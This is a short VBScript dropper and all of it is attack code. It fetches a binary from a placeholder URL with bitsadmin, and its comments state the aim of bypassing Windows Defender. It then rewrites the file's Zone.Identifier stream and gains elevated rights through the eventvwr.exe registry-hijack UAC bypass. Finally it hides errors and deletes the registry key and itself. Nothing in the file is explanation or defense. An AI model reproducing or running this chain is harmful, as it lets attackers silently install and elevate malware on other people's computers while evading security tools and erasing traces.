Sub Main()
	'Global var holding temp dir 
    tempdir = WScript.CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2)
	'Download our main bin using windows built in bitsadmin, to reduce code and bypass Windows Defender

    WScript.CreateObject("WScript.Shell").run("cmd /c bitsadmin /transfer myDownloadJob /download /priority FOREGROUND [URL] %temp%/[NAME]"),0,true
	'Lets set our zoneid to 2
    WScript.CreateObject("WScript.Shell").run("cmd.exe /C echo [zoneTransfer]ZoneID = 2 > " + tempdir + "\[NAME]:ZONE.identifier"),0,true
 	'Setup the reg-key for UAC bypass
    CreateObject("WScript.Shell").RegWrite "HKCU\Software\Classes\mscfile\shell\open\command\", tempdir +"\[NAME]" ,"REG_SZ"
 	'Trigger the bypass
    CreateObject("WScript.Shell").Run("eventvwr.exe"),0,true
 	'Cleanup after bypass
    Wscript.CreateObject("Wscript.Shell").RegDelete "HKCU\Software\Classes\mscfile\shell\open\command\"
 	'Cleanup after this script
    WScript.CreateObject("WScript.Shell").Run "cmd /c del %temp%\"  + WScript.ScriptName, 0, True
 
End Sub
 'We don't wanna show any errors
On Error Resume Next
 
  Main
 
  If Err.Number Then
     'on error cleanup and exit
     WScript.CreateObject("WScript.Shell").Run "cmd /c del %temp%\"  + WScript.ScriptName, 0, True
     WScript.Quit 4711
End If